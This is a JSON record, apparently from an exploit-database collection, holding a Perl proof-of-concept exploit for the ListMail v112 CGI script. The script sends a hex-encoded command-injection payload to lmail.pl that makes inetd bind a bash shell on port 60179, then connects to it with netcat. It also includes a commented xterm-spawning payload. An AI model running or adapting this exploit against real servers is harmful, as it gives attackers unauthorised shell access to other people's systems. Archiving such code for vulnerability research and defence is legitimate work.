{
  "id": "187",
  "title": "ListMail 112 - Command Execution",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl -w\r\n\r\n## Listmail v112 by P.M.Systems / PoC Exploit\r\n##\r\n## Listmail is a powerful, hands-free mailing\r\n## list manager which is exploitable due to an\r\n## insecure open call. This exploit will attempt\r\n## to bind a shell at port 60179/fido by using\r\n## inetd. Code to spawn an xterm is as always \r\n## included.\r\n##\r\n## http://teleh0r.cjb.net/ || teleh0r@doglover.com\r\n\r\nuse strict; use Socket;\r\n\r\nif (@ARGV < 1) {\r\n    print(\"Usage: $0 <target>\\n\");\r\n    exit(1);\r\n}\r\n\r\nmy($target,$length,$cgicode,$agent,$sploit, \r\n   $iaddr,$paddr,$proto);\r\n\r\n$target = $ARGV[0];\r\n\r\nprint(\"\\nRemote host: $target\\n\");\r\nprint(\"CGI-script: /cgi-bin/lmail.pl\\n\");\r\n\r\n$agent = \"Mozilla/4.0 (compatible; MSIE 5.01; Windows 95)\";\r\n\r\n# echo 'fido stream tcp nowait nobody /bin/bash bash -i' > /tmp/.hass;\r\n# /usr/sbin/inetd /tmp/.hass\r\n\r\n$cgicode =\r\n\r\n\"\\x63\\x66\\x67\\x3d\\x7c\\x65\\x63\\x68\\x6f\\x2b\\x27\\x66\\x69\".\r\n\"\\x64\\x6f\\x2b\\x73\\x74\\x72\\x65\\x61\\x6d\\x2b\\x74\\x63\\x70\".\r\n\"\\x2b\\x6e\\x6f\\x77\\x61\\x69\\x74\\x2b\\x6e\\x6f\\x62\\x6f\\x64\".\r\n\"\\x79\\x2b\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68\\x2b\\x62\".\r\n\"\\x61\\x73\\x68\\x2b\\x2d\\x69\\x27\\x2b\\x3e\\x2b\\x2f\\x74\\x6d\".\r\n\"\\x70\\x2f\\x2e\\x68\\x61\\x73\\x73\\x3b\\x2f\\x75\\x73\\x72\\x2f\".\r\n\"\\x73\\x62\\x69\\x6e\\x2f\\x69\\x6e\\x65\\x74\\x64\\x2b\\x2f\\x74\".\r\n\"\\x6d\\x70\\x2f\\x2e\\x68\\x61\\x73\\x73\\x7c\";\r\n\r\n# Code to spawn an xterm - exploit would have to be modfied.\r\n# cfg=%7Cxterm+-ut+-display+localhost%3A0%7C\r\n\r\n$sploit =\r\n\"POST /cgi-bin/lmail.pl HTTP/1.0\r\nConnection: close\r\nUser-Agent: $agent\r\nHost: $target\r\nContent-type: application/x-www-form-urlencoded\r\nContent-length: 130\r\n\r\n$cgicode\";\r\n\r\n$iaddr = inet_aton($target)                     || die(\"Error: $!\\n\");\r\n$paddr = sockaddr_in(80, $iaddr)                || die(\"Error: $!\\n\");\r\n$proto = getprotobyname('tcp')                  || die(\"Error: $!\\n\");\r\n\r\nsocket(SOCKET, PF_INET, SOCK_STREAM, $proto)    || die(\"Error: $!\\n\");\r\nconnect(SOCKET, $paddr)                         || die(\"Error: $!\\n\");\r\nsend(SOCKET,\"$sploit\\015\\012\", 0)               || die(\"Error: $!\\n\");\r\nclose(SOCKET);\r\n\r\nprint(\"\\nSleeping 5 seconds - waiting for the shell ...\\n\\n\");\r\nsleep(5); system(\"nc -w 10 $target 60179\"); exit(0);\r\n\r\n\r\n# milw0rm.com [2000-11-17]",
  "url": "https://www.exploit-db.com/exploits/187"
}